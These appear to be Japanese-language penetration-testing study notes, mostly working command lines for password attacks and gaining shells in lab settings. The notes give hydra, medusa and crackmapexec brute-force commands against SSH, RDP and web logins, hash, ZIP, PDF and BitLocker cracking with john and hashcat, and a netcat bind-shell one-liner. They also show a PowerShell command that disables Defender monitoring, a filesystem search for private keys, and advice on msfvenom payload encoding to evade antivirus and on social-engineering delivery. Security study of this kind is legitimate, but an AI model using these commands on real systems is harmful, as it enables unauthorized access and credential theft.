stegcracker HackerAccessGranted.jpg /path/to/wordlist.txt
```
 
### png
ファイルが.pngの場合は、zstegを使う
```sh
sudo gem install zsteg
```

データ全体から、データが埋め込まれているかの確認
```sh
zsteg -a banner.png
```

データ抽出
```sh
zsteg -E "b4,rgb,msb,xy" banner.png > pgp_key.asc
```

#### OpenPGP Public Keyが埋め込まれている時
```sh
gpg --import pgp_key.asc  
```


## 文字の画像などでモザイクがかかってて複合したい時
 - [https://github.com/spipm/Depix.git]を使う
 ```sh
git clone https://github.com/spipm/Depix.git
cd Depix
 ```

```
python3 depix.py -p <PATHTOIMAGE>/image.png -s
./images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png -o
<DESIREDPATH>/output.png
```
## ファイル転送
- [[File Transfer]]

## デフォルトのパスワードリスト
- サービスのバナーを取得できたら、まず、デフォルトの認証情報を試す
デフォルトのパスワードがない場合は以下を試す
```shell-session
admin:admin
admin:password
admin:<blank>
root:12345678
administrator:Password
```
- https://github.com/ihebski/DefaultCreds-cheat-sheet?tab=readme-ov-file
	- webサービスの最もよく知られているベンダーのデフォルトの資格情報の1つのドキュメント
	- ペンテスト/レッドチームエンゲージメント中にペンテスターを支援する

デフォルトの資格情報チートシートをpipでインストールして、検索できる
例
```shell
pip3 install defaultcreds-cheat-sheet
```

検索するとき
```sh
creds search tomcat
```

- Wifiのデフォルトの認証情報
	- https://www.softwaretestinghelp.com/default-router-username-and-password-list/
## パスワードリストを変異させる(Hashcat)
人がパスワードを設定するときに、複雑にしようとするが、その複雑にするプロセスには一貫した共通点がある
その共通点をトレースして、単純なパスワードを複雑化する
まず、ベースとするpassword.lstを用意する
```shell-session
cat password.list
```

下のルールを`custom.rule`に加えて、このルールに従って、password.lstを複雑化する

| **機能** | **説明**                     |
| ------ | -------------------------- |
| :      | 何もしない。                     |
| l      | すべての文字を小文字にしてください。         |
| u      | すべての文字を大文字にしてください。         |
| c      | 最初の文字を大文字にして、他の文字を小文字にします。 |
| sXY    | XのすべてのインスタンスをYに置き換えます。     |
| $!     | 末尾に感嘆符を追加                  |
| d      | 複製                         |
例 : cutom.ruleの中身
```shell-session
snowyowl644@htb[/htb]$ cat custom.rule

:
c
so0
c so0
sa@
c sa@
c sa@ so0
$!
$! c
$! so0
$! sa@
$! c so0
$! c sa@
$! so0 sa@
$! c so0 sa@
```

custom.ruleをベースとなるpassword.lstに適用する
```shell-session
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
```

もちろん、事前に作成されたルールリストもある
最もよく使われるルール
- best64.rule
パスワードの解読とカスタムワードリストの作成は、ほとんどの場合、推測ゲームであることに注意することが重要

上でうまくいかないときは、これ
- なんか、hashcat v6.2.6だとバグってる可能性あるらしい
```sh
hashcat -m 0 -a 0 -r upper_double.rule hash.txt /usr/share/wordlists/rockyou.txt
```

# Hash
## ハッシュの特定
```sh
sudo apt install hash-identifier
hash-identifier <HASH>
```

サイト
- https://hashes.com/en/tools/hash_identifier
## ハッシュのクラック(john)

**単純なハッシュ**
hashes.txtに直す
```bash
echo "ハッシュ" > hashes.txt
```

#### シングルクラックモード
 ハッシュの形式を指定して、johnを使って解析
 - 組み込みのワードリストおよび --wordlist オプションで指定した追加のワードリストと比較してハッシュをクラックしようとする
- さらに、--rules オプションで指定されたルール（もしあれば）を用いて候補パスワードを生成する
```bash
john --format=sha256 hashes_to_crack.txt
```

ハッシュの形式が不明な場合
```bash
hashid -m 'd5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163'
```
代表的なハッシュアルゴリズム↓

| **ID**   | 暗号化ハッシュアルゴリズム                                                         |
| -------- | --------------------------------------------------------------------- |
| `$1$`    | [MD5](https://en.wikipedia.org/wiki/MD5)                              |
| `$2a$`   | [Blowfish](https://en.wikipedia.org/wiki/Blowfish_\(cipher\))         |
| `$5$`    | [SHA-256](https://en.wikipedia.org/wiki/SHA-2)                        |
| `$6$`    | [SHA-512](https://en.wikipedia.org/wiki/SHA-2)                        |
| `$sha1$` | [SHA1crypt](https://en.wikipedia.org/wiki/SHA-1)                      |
| `$y$`    | [Yescrypt](https://github.com/openwall/yescrypt)                      |
| `$gy$`   | [Gost-yescrypt](https://www.openwall.com/lists/yescrypt/2019/06/30/1) |
| `$7$`    | [Scrypt](https://en.wikipedia.org/wiki/Scrypt)                        |

#### ワードリストモード
- 複数の単語リストを使用してパスワードを解読する"辞書攻撃"
- 正しい単語が見つかるまで、リスト内のすべての単語を1つずつ試す
- シングルクラックモードよりも効果的
	- より多くの単語を使うが、それでも比較的基本的だから
```shell-session
john --wordlist=<wordlist_file> --rules <hash_file>
```

- 単語リストは、1行に1語ずつ、プレーンテキスト形式にすることができる
- 複数の単語リストは、カンマで区切って指定できる
	- ルールセットを指定したり、組み込みのマングリングルールをワードリストの単語に適用したりできる
	- 数字の追加、文字の大文字化、特殊文字の追加などの変換を使用して、候補パスワードを生成できる
#### Incremental Mode
- 文字セットから可能なすべての文字の組み合わせを試すことで、パスワードを試す
- すべてのジョンモードの中で最も効果的でありながら、最も時間のかかるモード
- 最短のものから始めて、すべての可能な組み合わせを順番に試すため、パスワードが何であるかを知っているときに最も効果的
- すべての組み合わせがランダムに試されるブルートフォース攻撃よりもはるかに高速になる
	- 0~Zまでやって、また桁増やして0~Zまでやってみていくというブルートフォースに順序を持たせただけ
- インクリメンタルモードを使用して、標準のジョンモードを使用して解読するのが難しい脆弱なパスワードを解読することもできる
	- 例えば、ハッシュの答えが辞書には載ってない'aa11'とかだったら、辞書モード時だと無理で、インクリメンタルモードじゃないと無理だよねって話
```shell-session
john --incremental <hash_file>
```
- 指定されたハッシュファイル内のハッシュを読み、単一の文字から始めて、反復ごとに増分するすべての可能な文字の組み合わせを生成できる
- パスワードの複雑さ、マシン構成、および設定された文字数に応じて、完了までに長い時間がかかる可能性があることに注意することが重要
- デフォルトの文字セットは`a-zA-Z0-9`なので、特殊文字を使うときは、カスタム文字セットを使用する必要がある

## レインボーテーブル攻撃
- https://hashes.com/en/decrypt/hash
- https://crackstation.net/
- https://md5decrypt.net/en/

# 辞書攻撃

## サイト内の文章から辞書作成

CeWL
[CeWL](https://github.com/digininja/CeWL)と呼ばれる別のツールを使用して、会社のWebサイトから潜在的な単語をスキャンし、別のリストに保存できる

デフォルトの使い方
```sh
cewl http:// -w site_dict.txt
```

- スパイダーの深さ（`-d`）、単語の最小長（`-m`）、見つかった単語の小文字（--`--lowercase`）の保存、結果を保存するファイル（`-w`）など、いくつかのパラメータを指定する
```shell-session
cewl http://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
```

## ユーザー名リストの自動拡張

ユーザー名リストは**手動で作成することも可能**だが、**自動生成ツールを活用**すれば効率的に一般的なユーザー名フォーマットを作成できる。
### 1. わかっているユーザーネームをファイルにまとめる
```shell-session
snowyowl644@htb[/htb]$ cat usernames.txt 
bwilliamson
benwilliamson
ben.willamson
willamson.ben
bburgerstien
bobburgerstien
bob.burgerstien
burgerstien.bob
jstevenson
jimstevenson
jim.stevenson
stevenson.jim
```
### 2. 自動リスト生成ツールの実行
#### Username Anarchy
- ユーザー名を自動で生成するツール
- **`Username Anarchy`**（Rubyベースのツール）を使用すると、**実名リストから複数のユーザー名パターンを生成可能**
- Gitを使って攻撃ホストにツールをクローンし、実際の名前リストに適用する

1. **ツールをGitでクローン**
```bash
sudo apt install ruby -y
git clone https://github.com/urbanadventurer/username-anarchy.git
cd username-anarchy
```
1. **リストを使ってユーザー名を生成**
```bash
./username-anarchy -i ../username.list > username_anarchy.list
```

名前を使って、ユーザー名を生成する
```shell-session
./username-anarchy Jane Smith > jane_smith_usernames.txt
```
→ 実際の名前リストを基に、**一般的なユーザー名形式を自動的に作成**

#### CUPP
- CUPPとは？
	- ターゲットに関する個人情報をもとに、**カスタムパスワードリスト**を自動生成するツール
	- ブルートフォース攻撃の精度を高めるための「ターゲット特化型」辞書作成に使う
	- OSINT（オープンソース情報収集）と組み合わせると効果大

- 特徴
	- 被対象者のプロフィールからパスワードの傾向を想定
	- 誕生日やペット名、趣味、リート語、記号追加など多彩な変化を加えた単語を自動生成
	- 大量の情報を手動で組み合わせる手間を省ける

- CUPPに入力する情報（対話モード `cupp -i`）
	- 名前・名字・ニックネーム
	- 誕生日（本人、恋人、子どもなど）
	- パートナーの名前・誕生日
	- ペットの名前
	- 勤務先の会社名
	- 好きな言葉・趣味などのキーワード（任意）
	- 特殊文字の追加、数字の追加、リートモード（例：`a`→`@`, `e`→`3`）の使用設定

- インストール方法（Linuxの場合）
	```bash
sudo apt install cupp -y
	```

- 実行例（対話形式）
```bash
cupp -i
```
- プロンプトに従って情報を入力するだけで `.txt` 形式の辞書ファイルが生成される

- 生成されるパスワード例
	- janesmith, Jane1990, j4n3, smith1212!, hackerblue123, Spot@1990 など
	- 情報に基づいた高精度なパスワード候補が多数

- 応用テクニック
	- 企業のパスワードポリシーに合わせてフィルタリング
```bash
grep -E '^.{6,}$' jane.txt | grep '[A-Z]' | grep '[a-z]' | grep '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane_filtered.txt
```

- Hydraなどのブルートフォースツールと組み合わせて使う
```bash
hydra -L usernames.txt -P jane_filtered.txt IP -s PORT -f http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid credentials"
```

- まとめ
	- CUPPは「精度重視」の攻撃をしたいときに効果的
	- SNSや公開情報をうまく使って情報を集めるのがカギ
	- ワードリスト作成を自動化できるので、初心者でも扱いやすい
	- 
## 辞書拡張
```sh
john --wordlist=password.list --rules=custom --stdout | sort -u > mut_password.list
```

```shell-session
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
```

hashcatでのルール作成・適用
- `$1` - 末尾に "1" を追加
- `c` - 最初の文字を大文字に変換
```sh
kali@kali:~/passwordattacks$ cat demo1.rule     
$1 c $!

kali@kali:~/passwordattacks$ hashcat -r demo1.rule --stdout demo.txt
Password1!
Iloveyou1!
Princess1!
Rockyou1!
Abc1231!

kali@kali:~/passwordattacks$ cat demo2.rule   
$! $1 c

kali@kali:~/passwordattacks$ hashcat -r demo2.rule --stdout demo.txt
Password!1
Iloveyou!1
Princess!1
Rockyou!1
Abc123!1
```

## crackmapexec
```shell-session
crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
```
protoには、サービス名を指定する
winrmをブルートフォース
```shell-session
snowyowl644@htb[/htb]$ crackmapexec winrm 10.129.42.197 -u user.list -p password.list

WINRM       10.129.42.197   5985   NONE             [*] None (name:10.129.42.197) (domain:None)
WINRM       10.129.42.197   5985   NONE             [*] http://10.129.42.197:5985/wsman
WINRM       10.129.42.197   5985   NONE             [+] None\user:password (Pwn3d!)
```

## hydra
また、単一のユーザー名・パスワードの場合は小文字の-l、-pを使う
```shell-session
hydra -L user.list -P pass.list ftp://$Target_IP -v
```

hydraオプションの基本
```shell-session
hydra [login_options] [password_options] [attack_options] [service_options]
```

|                    |                                                                |                                                                                             |
| ------------------ | -------------------------------------------------------------- | ------------------------------------------------------------------------------------------- |
| `l LOGIN``-L FILE` | ログインオプション：単一のユーザー名（`-l`）またはユーザー名のリスト（`-L`）を含むファイルを指定します。       | `hydra -l admin ...``hydra -L usernames.txt ...`                                            |
| `-p PASS``-P FILE` | パスワードオプション：単一のパスワード（`-p`）またはパスワードのリストを含むファイル（`-P`）のいずれかを提供します。 | `hydra -p password123 ...``hydra -P passwords.txt ...`                                      |
| `-t TASKS`         | タスク：実行する並列タスク（スレッド）の数を定義し、攻撃を高速化する可能性があります。                    | `hydra -t 4 ...`                                                                            |
| `-f`               | ファストモード：最初のログインが見つかったら、攻撃を停止します。                               | `hydra -f ...`                                                                              |
| `-s PORT`          | ポート：ターゲットサービスにデフォルト以外のポートを指定します。                               | `hydra -s 2222 ...`                                                                         |
| `-v``-V`           | 詳細な出力：試行と結果を含む、攻撃の進行状況に関する詳細情報を表示します。                          | `hydra -v ...`または`hydra -V ...`（さらに冗長性のために）                                                 |
| `service://server` | ターゲット：サービス（例：`ssh`、`http`、`ftp`）とターゲットサーバーのアドレスまたはホスト名を指定します。  | `hydra ssh://192.168.1.100`                                                                 |
| `/OPT`             | サービス固有のオプション：対象サービスに必要な追加オプションを提供します。                          | `hydra http-get://example.com/login.php -m "POST:user=^USER^&pass=^PASS^"`（HTTPフォームベースの認証用） |
|                    |                                                                |                                                                                             |

### Hydra サービス別コマンド

基本的
パスワードファイル : /usr/share/wordlists/rockyou.txt 
ユーザーファイル : /usr/share/wordlists/dirb/others/names.txt

| **サービス**          | **コマンド例**                                                                                                          |
| ----------------- | ------------------------------------------------------------------------------------------------------------------ |
| **FTP**           | hydra -l admin -P hydra -l george -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.100                          |
| **SSH**           | hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100                                              |
| **HTTP-GET/POST** | hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect" |
| **SMTP**          | hydra -l admin -P /usr/share/wordlists/rockyou.txt smtp://mail.server.com                                          |
| **POP3**          | hydra -l user@example.com -P /usr/share/wordlists/rockyou.txt pop3://mail.server.com                               |
| **IMAP**          | hydra -l user@example.com -P /usr/share/wordlists/rockyou.txt imap://mail.server.com                               |
| **MySQL**         | hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://192.168.1.100                                            |
| **MSSQL**         | hydra -l sa -P /usr/share/wordlists/rockyou.txt mssql://192.168.1.100                                              |
| **VNC**           | hydra -P /usr/share/wordlists/rockyou.txt vnc://192.168.1.100                                                      |
| **RDP**           | hydra -l admin -P /usr/share/wordlists/rockyou.txt rdp://192.168.1.100                                             |
辞書を作らなくてもこんな感じでもできる
- 6〜8文字の全パターンを自動生成（英小文字・英大文字・数字）
```bash
hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp
```

- **このコマンドがやってること**
	- `-l administrator` → ログイン名として「administrator」を指定
	- `-x 6:8:...` → 6〜8文字の全パターンを自動生成（英小文字・英大文字・数字）
	- `192.168.1.100` → 攻撃対象のIPアドレス
	- `rdp` → RDPサービスを対象に指定

### Basic認証に対するブルートフォース
辞書の取得
```sh
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt
```

ブルートフォースの実行
```shell-session
hydra -l basic-auth-user -P /usr/share/wordlists/rockyou.txt 127.0.0.1 http-get / -s 81
```
- `-l basic-auth-user` → ログイン試行に使うユーザー名を指定
- `-P 2023-200_most_used_passwords.txt` → 使用するパスワードリスト
- `127.0.0.1` → ターゲットのIP（この場合はローカルホスト）
- `http-get /` → HTTPのGETメソッドでルートパス（`/`）を攻撃対象に
- `-s 81` → ポート番号を明示的に指定（通常80だが、ここでは81を使用）


### カスタムログインフォームへのブルートフォース
- カスタムログインフォームとは？
	- Webサイトが使っている、独自デザインのログイン画面
	- 見た目は違っても、内部的には同じように動作していることが多い

必要なもの
- Burpでのログイン試行時のリクエスト
- ログイン試行失敗時のResponse内の、失敗時特有のエラーメッセージ

辞書の取得
```shell-session
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt
```

実行
```shell-session
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
```

でも、ffufの方がやりやすくない？とかは思う
- どっちでもいい
```sh
ffuf -w top-usernames-shortlist.txt:USER -w 2023-200_most_used_passwords.txt:PASS -X POST -d "username=USER&password=PASS" -u http://IP:PORT/ -fr "Invalid credentials"
```


## medusa
| **項目**       | **Hydra**                  | **Medusa**                     |
| ------------ | -------------------------- | ------------------------------ |
| 💡 特徴        | 柔軟でシンプルなコマンド構文。対応プロトコルが広い。 | 超高速＆並列処理に強い。大量ターゲットの一括スキャンが得意。 |
| 🚀 速度        | 並列処理はあるが、Medusaより若干遅い      | 圧倒的に速い（数千スレッドでも安定）             |
| 🧠 学習コスト     | 初心者向け。わかりやすい構文。            | やや複雑。オプションが多め                  |
| 🛠️ 対応プロトコル  | 50以上対応（Webフォーム、SSH、RDPなど）  | Hydraに近いがやや少なめ（実用的には十分）        |
| 🔁 大量ホスト対応   | スクリプトなどで対応可能               | 複数ホストを一括で簡単に処理できる（-H）          |
| 🌐 Webフォーム対応 | http-post-formで高機能に対応      | web-formモジュールもあるが柔軟性はHydraが上   |
| 📦 標準搭載      | Kali, Parrotなどにプリインストール    | 同じく多くのペンテスト用OSに搭載済み            |
| 🔍 デバッグ・出力   | Verboseログが細かくてわかりやすい       | ログはややシンプル。高速処理に特化              |
```sh
medusa [ターゲット関連オプション] [認証情報関連オプション] -M モジュール [モジュール固有オプション]
```

| **パラメータ** | **説明**                              | **使用例**                                                   |
| --------- | ----------------------------------- | --------------------------------------------------------- |
| -h or -H  | 単一のターゲット（-h）またはターゲットのリストファイル（-H）を指定 | medusa -h 192.168.1.10 ... または medusa -H targets.txt ...  |
| -u or -U  | 単一ユーザー名（-u）またはユーザーリストファイル（-U）を指定    | medusa -u admin ... または medusa -U users.txt ...           |
| -p or -P  | 単一パスワード（-p）またはパスワードリストファイル（-P）を指定   | medusa -p password123 ... または medusa -P passwords.txt ... |
| -M        | 攻撃に使うモジュールを指定（例：ssh, ftp）           | medusa -M ssh ...                                         |
| -m        | モジュール専用の追加オプション（ダブルクォートで囲む）         | **HTTPフォーム送信などに使う：**medusa -M http -m "POST /login ..."   |
| -t        | 並列スレッド数（並列で試行できる数）                  | medusa -t 4                                               |
| -f or -F  | 成功時に停止（-f: 現在のホストのみ、-F: すべてのホストで停止） | medusa -f ... または medusa -F ...                           |
| -n        | 非標準ポートを指定（例：2222など）                 | medusa -n 2222                                            |
| -v        | 詳細出力（最大6レベル）                        | medusa -v 4                                               |
#### medusaのサービス別コマンド
| **モジュール名** | **サービス/プロトコル** | **説明**                             | **使用例**                                                                                                                   |
| ---------- | -------------- | ---------------------------------- | ------------------------------------------------------------------------------------------------------------------------- |
| ftp        | FTP            | ファイル転送用プロトコルのログイン情報をブルートフォース       | medusa -M ftp -h 192.168.1.100 -u admin -P passwords.txt                                                                  |
| http       | HTTP           | Webアプリのフォームログイン（GET/POST）をブルートフォース | medusa -M http -h www.example.com -U users.txt -P passwords.txt -m DIR:/login.php -m FORM:username=^USER^&password=^PASS^ |
| imap       | IMAP           | メールサーバーのIMAP認証に対して試行               | medusa -M imap -h mail.example.com -U users.txt -P passwords.txt                                                          |
| mysql      | MySQL          | データベース（MySQL）の認証情報を試行              | medusa -M mysql -h 192.168.1.100 -u root -P passwords.txt                                                                 |
| pop3       | POP3           | メール取得プロトコルへのブルートフォース               | medusa -M pop3 -h mail.example.com -U users.txt -P passwords.txt                                                          |
| rdp        | RDP            | Windowsのリモートデスクトップログインをブルートフォース    | medusa -M rdp -h 192.168.1.100 -u admin -P passwords.txt                                                                  |
| ssh        | SSH            | セキュアシェルへの認証を試行（ポピュラー）              |                                                                                                                           |
| svn        | Subversion     | バージョン管理ツールSVNの認証に対して攻撃             | medusa -M svn -h 192.168.1.100 -u admin -P passwords.txt                                                                  |
| telnet     | Telnet         | 古いリモート端末プロトコルへの試行                  | medusa -M telnet -h 192.168.1.100 -u admin -P passwords.txt                                                               |
| vnc        | VNC            | リモートデスクトップ（VNC）へのブルートフォース          | medusa -M vnc -h 192.168.1.100 -P passwords.txt                                                                           |
| web-form   | Webログインフォーム    | HTTP POST を使うログインフォームへの攻撃          | medusa -M web-form -h www.example.com -U users.txt -P passwords.txt -m FORM:"username=^USER^&password=^PASS^:F=Invalid"   |

## nxc
 - hydraの誤検知が多い時
```sh
nxc rdp 192.168.191.227 -u 'nadine' -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding --local-auth
```

## 有用なファイルの検索
エンコードされたファイルの検索
```shell-session
for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```

SSHキーの検索
```shell-session
grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"
```

暗号化されたSSHの検索
```shell-session
cat /home/cry0l1t3/.ssh/SSH.private
```

SSH の秘密鍵 (SSH.private) を John the Ripper でクラックできる形式 (hash) に変換する
SSH.privateは、id_rsaに置き換えられる
出力を ssh.hash に保存。
```shell-session
ssh2john.py SSH.private > ssh.hash
cat ssh.hash 
```

SSHキーのクラック
```shell-session
john --wordlist=rockyou.txt ssh.hash
```

## パスワード付きファイルのクラック
- パスワードで保護されたファイルや暗号化されたファイルも解読することもできる
```shell-session
<tool> <file_to_crack> > file.hash
pdf2john server_doc.pdf > server_doc.hash
john server_doc.hash
```

```sh
john --wordlist=<wordlist.txt> server_doc.hash 
```

また、それぞれのファイルにあったjohnを見つけて使用することもできる
それぞれのツールにあったjohnを検索する
```shell-session
locate *2john*
```

Microsoft Office ドキュメントのクラッキング
```shell-session
office2john.py Protected.docx > protected-docx.hash
cat protected-docx.hash
```

```shell-session
john --wordlist=rockyou.txt protected-docx.hash
john protected-docx.hash --show
```

PDF のクラッキング
```shell-session
pdf2john.py PDF.pdf > pdf.hash
cat pdf.hash 
```

```shell-session
john --wordlist=rockyou.txt pdf.hash
john pdf.hash --show
```
**複雑な形式**
1. まず自分の目的に合ったjohnのスクリプトを探して、johnが解析できる.johnの形に変換する
```bash
sudo find / -iname *2john* -type f 2>/dev/null
```
1. johnでワードリストを指定して解析
```bash
sudo john --wordlist=/usr/share/wordlists/rockyou.txt 探したい.john
```


## パスワード付き圧縮ファイルのクラック
zipファイルのクラック
- パスワード付きzipをjohnが解析する形にする
- rockyou.txtで辞書攻撃する
- クラックされたハッシュの表示
```shell-session
zip2john ZIP.zip > zip.hash
cat zip.hash 
john --wordlist=rockyou.txt zip.hash
john zip.hash --show
```

```shell-session
john --wordlist=rockyou.txt zip.hash
```

gzipファイルのクラック
```shell-session
for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null| tar xz;done
```

bitlockerファイルのクラック
```shell-session
bitlocker2john -i Backup.vhd > backup.hashes
grep "bitlocker\$0" backup.hashes > backup.hash
cat backup.hash
hashcat -m 22100 backup.hash /usr/share/wordlists/rockyou.txt -o backup.cracked
cat backup.cracked 
```

パスワードを解読すると、暗号化されたドライブを開く
BitLocker で暗号化された仮想ドライブをマウントする最も簡単な方法は、それを Windows システムに転送してマウントする

# ペイロード
## シェルの設置
### リバースシェル
攻撃者側でポートを開いて待ち受けて、そこにターゲットがアクセスすることでシェルを取得する
- なんか443で待ち受けておくと、ターゲットにファイアーウォールがあったとしてもスルーすることができる
- https://www.revshells.com/
ターゲットがWindowsの場合は、AntiVirus(AV)が働く可能性があるから、その時は、PSを右クリックから管理者権限で起動して、以下のコマンドを打つことで、AVをオフにできるって
```powershell-session
PS C:\Users\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true
```


### バインドシェル
ターゲット側でポート開いて待ち受けて、そこに攻撃者がアクセスすることで、シェルを取得する
バインドシェルの方が防御されやすい
- 接続は受信されるため、リスナーの起動時に標準ポートを使用しても、ファイアウォールによって検出およびブロックされる可能性が高くなるから

コマンド
- ターゲット側
```shell-session
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <ターゲットのIP> 7777 > /tmp/f
```
- 攻撃者側
```shell-session
nc -nv <ターゲットのIP> 7777
```

### Webシェル
- webページ上でのシェル
- 普通に使い勝手悪くね？
- リバースシェルでいいんじゃねとか思っちゃうけど
	- そもそもリバースシェルのコマンドを仕込めない（アップロードしかできない、またはコマンド実行の権限が限定的）
	- 外向き通信（外部への接続）が制限されている
	- Web インターフェース越しに操作できる手段が欲しい（内向き通信しか許可されていないネットワークなど）
- PHPWebshell
	- https://github.com/WhiteWinterWolf/wwwolf-php-webshell
Windows
- Laudanum
	- `asp, aspx, jsp, php,`などを含む多くの異なるwebシェルの一覧がある
	- `/usr/share/laudanum`にある
	- Laudanum内のほとんどのファイルについては、そのままコピーして、被害者の実行に必要な場所に配置できる
	- シェルなどの特定のファイルについては、最初にファイルを編集して`attacking`するホストのIPアドレスを挿入して、Webシェルにアクセスしたり、リバースシェルを使用するインスタンスでコールバックを受信したりする必要がある
	- 59行目に攻撃者のIPも書き加える
- Antak
	- `/usr/share/nishang/Antak-WebShell`にある
	- Powershellコマンドを使えるwebシェル
	- 編集する必要がある
		- 14行目を、ユーザー（緑の矢印）とパスワード（オレンジ色の矢印）を追加する
	- 以下の画像のように付け加える

![](https://i.imgur.com/BVfKA3s.png)

### その他のペイロード生成ツール

|                                   |                                                                                                                                                                                                              |
| --------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `MSFVenom & Metasploit-Framework` | [Source](https://github.com/rapid7/metasploit-framework) MSFは、あらゆるペンテスターのツールキットのための非常に汎用性の高いツールです。これは、ホストを列挙し、ペイロードを生成し、パブリックエクスプロイトとカスタムエクスプロイトを利用し、ホストで一度エクスプロイト後のアクションを実行する方法として機能します。スイスアーミーナイフと考えてください。 |
| `Payloads All The Things`         | [ソース](https://github.com/swisskyrepo/PayloadsAllTheThings) ここでは、ペイロード生成と一般的な方法論に関するさまざまなリソースとチートシートを見つけることができます。                                                                                             |
| `Mythic C2 Framework`             | [ソース](https://github.com/its-a-feature/Mythic) Mythic C2フレームワークは、独自のペイロード生成のためのコマンドおよび制御フレームワークおよびツールボックスとしてのMetasploitの代替オプションです。                                                                           |
| `Nishang`                         | [Source](https://github.com/samratashok/nishang) Nishangは、Offensive PowerShellインプラントとスクリプトのフレームワークコレクションです。これには、どのペンテスターにも役立つ多くのユーティリティが含まれています。                                                             |
| `Darkarmour`                      | [Source](https://github.com/bats3c/darkarmour) Darkarmourは、Windowsホストに対して使用するために難読化されたバイナリを生成して利用するツールです。                                                                                                    |


# Metasploit 
なんか検索全体で、こんな感じで、`grep` で検索できるらしい
```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter grep reverse_tcp show payloads
```
## Moduleのタイプ
- Auxiliary  
    スキャン、ファズ、スニッフィング、管理などの補助的な機能を提供し、追加サポートを行います。
- Encoders
    ペイロードがターゲットに正しく届くように変換処理を行います。
- Exploits  
    ペイロードの配信を可能にする脆弱性を突くモジュールです。
- NOPs
    （No-Operationの略）エクスプロイト実行時にペイロードのサイズを一定に保つ役割を果たします。
- Payloads
    リモートでコードを実行し、攻撃者のマシンにコールバックして接続（またはシェル）を確立します。
- Plugins
    追加スクリプトがmsfconsoleに統合され、評価作業をサポートします。
- Post
    情報収集やさらなるネットワーク内移動（ピボット）のための各種モジュールです。

- モジュールについてさらに知りたいとき : モジュールを選択した後、コマンド`info`


## Targetsについて
- ターゲットには、Internet Explorerの異なるバージョンや様々なWindowsバージョンが含まれる  
- 「Automatic」を選択すると、msfconsoleは攻撃成功前に指定されたターゲットでのサービス検出を行う
- 対象システムのバージョンが分かっている場合は、`show targets`の後に、`set target <index no.>`コマンドでリストから適切なターゲットを選択できる  
- ターゲットは、選択したエクスプロイトモジュールを特定のOSバージョンに適応させるための一意の識別子として機能する  

## Payloadについて
- 中でMsfvenomが動いているので、上のMsfvenomの説明
- `grep meterpreter show payloads`で検索して、`set payload`で設定して、`show payload options`でオプションを検索する

Metaploit内では、以下で、payloadとencordを行える
- 利用可能なペイロードと同様に、エンコーダもエクスプロイトモジュールに従って自動的にフィルタリングされ、互換性のあるペイロードのみが表示される
```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload 15

payload => windows/x64/meterpreter/reverse_tcp


msf6 exploit(windows/smb/ms17_010_eternalblue) > show encoders

Compatible Encoders
===================

   #  Name              Disclosure Date  Rank    Check  Description
   -  ----              ---------------  ----    -----  -----------
   0  generic/eicar                      manual  No     The EICAR Encoder
   1  generic/none                       manual  No     The "none" Encoder
   2  x64/xor                            manual  No     XOR Encoder
   3  x64/xor_dynamic                    manual  No     Dynamic key XOR Encoder
   4  x64/zutto_dekiru                   manual  No     Zutto Dekiru
```


### MSFVenom
- ペイロード生成とエンコードを一括で行える
- ペイロード作成
	- 各種OS・アーキテクチャ向けに多様なペイロードを生成
	- リバースシェルやバインドシェル、Meterpreterなど、Metasploitが提供するペイロードを一括で扱える
- ペイロードの暗号化・エンコード
	- MSFvenomの機能により、ウイルス対策ソフトに検知されにくい形でペイロードを作成可能
	- エンコードや暗号化を利用することで、一般的なシグネチャをバイパスできる可能性が高まる
- ソーシャルエンジニアリングとの組み合わせ
	- メールに添付して実行を誘導したり、悪意あるWebリンクとして配布するなど、多彩な攻撃シナリオで活用
	- 直接ネットワーク経由で攻撃できない場合に、ユーザーダブルクリック誘導などがよく使われる方法

- ペイロードのリストの一覧を表示する
```shell-session
msfvenom -l payloads
```

Descriptionに書いてあるstagedとstagelessの違い
- staged
	- マルウェアのダウンローダーみたいな感じで、最初に実行して、外部サーバーから本命の大きなペイロード実行ファイルをダウンロードして、実行する
	- メモリを食う
	- ターゲットのネットワークが安定していないと無理
- stageless
	- ステージなしでネットワーク接続を介して全体として送信される
	- 十分のネットワークリソースにアクセスできない環境で、遅延が干渉する可能性がある場合に有効
	- **ステージレスペイロードの方が良い！**
	- ソーシャルエンジニアリングの時も回避しやすい
- 見分け方
	- 名前に`/`で細かく区切りが多い→staged
